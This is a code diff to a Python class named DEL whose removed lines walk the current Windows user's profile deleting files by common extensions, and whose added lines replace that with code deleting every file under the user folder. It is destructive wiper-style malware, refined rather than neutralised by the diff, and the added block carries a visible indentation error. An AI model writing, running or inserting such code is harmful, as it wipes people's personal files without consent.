@@ -27,24 +27,11 @@ class WNA:
 
 class DEL:
 
-    def __init__(self):
-        self.V_list = ['C:\\Users\\%s' % win32api.GetUserName()]
-        self.extensions = ['.txt', '.doc', '.jpg', '.png', '.docx', '.ppt',
-                           '.mp3', '.mp4', '.wav', '.bmp', '.avi', '.obj',
-                           '.svg', '.pdf', '.dll', '.html', '.gif']
-        self.crawler()
-        self.menace()
-
-    def crawler(self):
-        for root, dirs, files in os.walk(self.V_list[0]):
-            if root is not self.V_list:
-                self.V_list.append(root)
-
-    def menace(self):
-        try:
-            for i in range(len(self.V_list)):
-                for j in range(len(self.extensions)):
-                    win32api.DeleteFile('"%s\\*%s"' % (self.V_list[i], self.extensions[j]))
-        except:
-            pass
-
+        def __init__(self):
+        self.dir = 'C:\\Users\\%s' % win32api.GetUserName()
+        for root, dirs, files in os.walk(self.dir, topdown=False):
+            for name in files:
+                try:
+                    win32api.DeleteFile(os.path.join(root, name))
+                except Exception as e:
+                    print(e)
